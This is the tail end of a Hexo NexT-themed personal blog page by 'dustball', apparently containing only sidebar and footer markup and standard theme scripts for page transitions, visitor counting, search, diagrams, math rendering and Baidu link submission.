    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="dustball"
      src="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
  <p class="site-author-name" itemprop="name">dustball</p>
  <div class="site-description" itemprop="description">dustland</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">dustball</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  
  <script data-pjax>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
<script src="/js/algolia-search.js"></script>












<script data-pjax>
if (document.querySelectorAll('pre.mermaid').length) {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
    mermaid.initialize({
      theme    : 'dark',
      logLevel : 3,
      flowchart: { curve     : 'linear' },
      gantt    : { axisFormat: '%m/%d/%Y' },
      sequence : { actorMargin: 50 }
    });
  }, window.mermaid);
}
</script>


    <div id="pjax">
  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

    </div>
</body>
</html>
